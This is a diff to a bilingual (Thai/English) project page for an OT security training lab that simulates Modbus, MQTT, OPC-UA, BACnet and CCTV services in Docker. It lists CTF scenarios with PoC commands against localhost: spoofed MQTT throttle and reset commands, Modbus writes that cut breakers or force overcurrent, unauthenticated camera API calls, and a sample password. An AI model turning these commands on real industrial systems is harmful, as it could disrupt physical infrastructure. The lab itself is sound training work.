@@ -9,6 +9,8 @@ category: Home Labs
 draft: false
 ---
 
+# ENGLISH BELOW
+
 # OT Security Simulator
 
 **Sentinel 7 OT Security Simulator** - ห้องทดลองจำลองระบบอุตสาหกรรม (OT) สำหรับฝึก CTF / PenTest โดยไม่ต้องใช้ Hardware จริง รองรับโปรโตคอลสำคัญของ OT เช่น **Modbus, MQTT, OPC-UA, BACnet, RTSP/CCTV** พร้อมระบบ Dashboard สำหรับสังเกตการทำงานของระบบจำลอง โดยใช้ Telegraf - InfluxDB - Grafana
@@ -73,8 +75,8 @@ draft: false
 **การติดตั้งและรันระบบ**
 
 ```bash
-git clone <your-repo-url>
-cd <repo-name>
+git clone https://github.com/netw0rk7/OT-Security-Simulation-Labs
+cd OT-Security-Simulation-Labs
 
 # แก้ .env ถ้าต้องการเปลี่ยน Credential เข้าสู่ระบบ / InfluxDB token
 docker compose up -d
@@ -388,3 +390,310 @@ curl -s -X POST http://127.0.0.1:5000/api/power/on | jq .
 # Safety&Ethics
 
 โปรเจกต์นี้มีช่องโหว่ตั้งใจให้ใช้เพื่อการฝึกเท่านั้น - **ห้าม** เชื่อมต่อคอนเทนเนอร์กับเครือข่ายโปรดักชันหรืออินเทอร์เน็ตสาธารณะโดยเด็ดขาด ใช้งานในเครือข่ายแยก (isolated / offline) เท่านั้น
+
+---
+
+# OT Security Simulator
+
+**Sentinel 7 OT Security Simulator** – A fully simulated industrial OT environment for CTF / PenTest training without requiring real hardware. Supports **Modbus, MQTT, OPC-UA, BACnet, RTSP/CCTV**, with monitoring dashboards powered by Telegraf – InfluxDB – Grafana.
+
+![Logo](https://github.com/user-attachments/assets/21320071-b9b1-482e-bba8-851891681059)
+
+---
+
+## Table of Contents
+
+- Features  
+- Architecture  
+- Quickstart  
+- Services Address  
+- Configuration  
+- Services  
+- Grafana & Data Flow  
+- CTF / PenTest — Scenarios & Flags  
+- Important Protocols & Ports  
+- Example PoC / Attack Commands  
+- Further Development  
+- Safety & Ethics  
+
+---
+
+# Features
+
+- Simulates multiple OT protocols: **Modbus/TCP**, **MQTT**, **OPC-UA**, **BACnet**, **RTSP (CCTV)**, **HTTP Web UI**
+- Pre‑provisioned Grafana dashboards and Telegraf configuration  
+- Runs entirely via **Docker Compose** — perfect for labs / training / CTF  
+- PoC tools included: `mbpoll`, `pymodbus`, `mosquitto_pub/sub`, `curl`, `jq`
+- Contains intentionally vulnerable points for CTF mode (writable registers, open MQTT topics)
+
+---
+
+# Architecture (Logical overview)
+
+```
+[ Attacker / Lab's Laptop ]
+           |
+        Docker Host
+           |
+   docker-compose network(s)
+   ├─ mosquitto (MQTT)
+   ├─ plc_modbus (Modbus TCP)
+   ├─ opcua_server (OPC-UA)
+   ├─ influxdb <- telegraf (reads from MQTT/OPC/Modbus)
+   ├─ grafana (dashboards)
+   ├─ HSL/RTSP media server (CCTV)
+   └─ cctv_control (Flask HTTP UI for camera/CTF)
+```
+
+---
+
+# Quickstart
+
+**Prerequisites**
+
+- Docker & Docker Compose  
+- Tools: `mbpoll`, `pymodbus`, `mosquitto_pub`, `mosquitto_sub`, `curl`, `jq`
+
+**Install & Run**
+
+```bash
+git clone https://github.com/netw0rk7/OT-Security-Simulation-Labs
+cd OT-Security-Simulation-Labs
+
+# Edit .env if you want to change Grafana/InfluxDB credentials or tokens
+docker compose up -d
+
+# Check container status
+docker compose ps
+```
+
+**Services Address**
+
+- **Grafana:** `http://localhost:3000` (user: `admin` / password from `.env`)  
+- **InfluxDB UI:** `http://localhost:8086`  
+- **MQTT:** `localhost:1883`  
+- **CCTV web UI:** `http://localhost:5000/`  
+- **OPC-UA:** `opc.tcp://localhost:4840`  
+- **Modbus:** `localhost:1502` → container:502  
+- **Access Control System** — **[IN‑PROCESS]**  
+- **Safety Interlock** — **[IN‑PROCESS]**  
+- **SCADA/HMI:** `http://localhost:8080/` — **[IN‑PROCESS]**
+
+---
+
+# Configuration
+
+Modify the `.env` file (Grafana passwords, InfluxDB token, etc.) before running this as a Lab system.
+
+Port Mapping (External:Container):
+
+```
+1883:1883   — MQTT  
+8086:8086   — InfluxDB  
+3000:3000   — Grafana  
+5000:5000   — CCTV Web Control  
+8554:8554   — CCTV RTSP  
+8888:8888   — CCTV HLS  
+4840:4840   — OPC-UA  
+1502:502    — Modbus  
+```
+
+Check environment variables in `docker-compose.yml` and under `services/*`.
+
+---
+
+# Services
+
+- `services/plc_modbus/` — Modbus TCP Server (pymodbus) simulating Turbine/Power registers  
+- `services/turbine_core/` — Gas Turbine simulator (publishes MQTT, updates OPC-UA)  
+- `services/opcua_server/` — OPC-UA server with Turbine nodes  
+- `services/bacnet_sim/` — BACnet AHU simulator  
+- `services/power_switchgear/` — Power Switchgear (Modbus) simulator  
+- `services/iot_sensors/` — IoT Sensor simulator providing HVAC values  
+- `cctv_control/` — Flask Web UI for cameras (CTF mode; flags stored in `state.json`)  
+- `grafana/` — Provisioned dashboards  
+- `telegraf/` — Configured to read MQTT/OPC-UA/Modbus and forward to InfluxDB  
+
+---
+
+# Services (In Development)
+
+- `services/safety_interlock/` — Safety interlock logic via MQTT + Modbus  
+- `services/access_alarm/` — Physical security subsystem  
+- `services/scada_hmi/` — Centralized SCADA dashboard  
+
+---
+
+# Grafana & Data Flow
+
+**Telegraf** collects data from:
+
+- `inputs.mqtt_consumer` — reads telemetry  
+- `inputs.opcua` — polls OPC-UA nodes  
+- `inputs.modbus` — polls Modbus registers  
+
+Data is written into **InfluxDB**, then visualized through **Grafana**.
+
+Dashboards (folder `grafana/dashboards/`):
+
+- `ot-overview.json` — Global OT overview  
+- `building-ahu.json` — AHU system  
+- `building-power-modbus.json` — Power panel monitoring  
+
+---
+
+# CTF / PenTest — Scenarios
+
+## Scenario 1 — Turbine Over Temperature / Over Speed
+
+- Service: **MQTT** (`1883`)
+- Behavior: If temperature > 700°C OR RPM > 8000 for more than 5 seconds → turbine trips.
+
+**PoC**
+
+```bash
+mosquitto_pub -h 127.0.0.1 -p 1883 -t "factory/turbine/cmd/thorttle" -m "100"
+```
+
+Reset turbine:
+
+```bash
+mosquitto_pub -h 127.0.0.1 -p 1883 -t "factory/turbine/cmd/reset" -m "1"
+```
+
+---
+
+## Scenario 2 — Camera Control [CTF Mode]
+
+- Service: **Flask CCTV control**, port `5000`
+- If `INSECURE_POWER=1` — unauthenticated API access:  
+  `/api/power/on`, `/api/power/off`  
+  → returns **flag** from `state.json`.
+
+**PoC**
+
+```bash
+curl -s -X POST http://localhost:5000/api/power/off | jq .
+```
+
+---
+
+## Scenario 3 — Camera Control [Secure Mode]
+
+- If `INSECURE_POWER=0` — authentication required.
+
+**PoC**
+
+```bash
+curl -s -u admin:P@ssw0rd -X POST http://localhost:5000/api/power/off | jq .
+```
+
+---
+
+## Scenario 4 — Power Cut-Off (Modbus)
+
+- Service: `power_switchgear`  
+- Writing a coil turns breaker ON/OFF.
+
+**PoC**
+
+```bash
+mbpoll 127.0.0.1 -0 -a 1 -r 0 -1 -t 0 -p 42001 0
+```
+
+---
+
+## Scenario 5 — Power Overload (Modbus)
+
+- Overwrite Current register to trigger Overcurrent alarm.
+
+**PoC**
+
+```bash
+mbpoll 127.0.0.1 -0 -a 1 -r 20 -1 -t 4:int -p 42001 999999
+```
+
+---
+
+# Important Protocols & Ports
+
+## MQTT Topics (Turbine)
+
+```
+factory/turbine/status
+factory/turbine/telemetry/rpm
+factory/turbine/telemetry/temp
+factory/turbine/telemetry/vib
+factory/turbine/telemetry/mw
+alerts/turbine/failure
+```
+
+## Modbus Holding Registers
+
+| HR (0‑based) | Description |
+|--------------|-------------|
+| 0–7          | Voltage (V) |
+| 20–27        | Current (A) |
+| 40–47        | Power (kW) |
+| 60–67        | Energy (kWh) |
+| 100          | Alarm (0/1) |
+
+## Modbus Coils
+
+| CN | Description |
+|----|-------------|
+| 0–7 | Breakers |
+
+## OPC-UA Nodes (ns=2)
+
+`Turbine.RPM`, `Turbine.TEMP`, `Turbine.VIB`, `Turbine.MW`, `Turbine.Trip`, `Turbine.Throttle`
+
+---
+
+# Example PoC / Attack Commands
+
+Read MQTT:
+
+```bash
+mosquitto_sub -h 127.0.0.1 -t 'factory/turbine/telemetry/#' -v
+```
+
+Fake telemetry:
+
+```bash
+mosquitto_pub -h 127.0.0.1 -t 'factory/turbine/cmd/throttle' -m '100'
+```
+
+Reset turbine:
+
+```bash
+mosquitto_pub -h 127.0.0.1 -t 'factory/turbine/cmd/reset' -m '1'
+```
+
+Toggle Modbus coil:
+
+```bash
+mbpoll 127.0.0.1 -0 -a 1 -r 0 -1 -t 0 -p 42001 0
+```
+
+CCTV API:
+
+```bash
+curl -s -X POST http://127.0.0.1:5000/api/power/on | jq .
+```
+
+---
+
+# Further Development
+
+- Add new service folders under `services/` with Dockerfile  
+- Add new dashboards (JSON) under `grafana/dashboards/`  
+- Can integrate IDS/IPS/SIEM
+
+---
+
+# Safety & Ethics
+
+This project intentionally contains vulnerabilities for training.  
+**Do NOT** connect it to production or public networks.  
+Use only in isolated/offline environments.
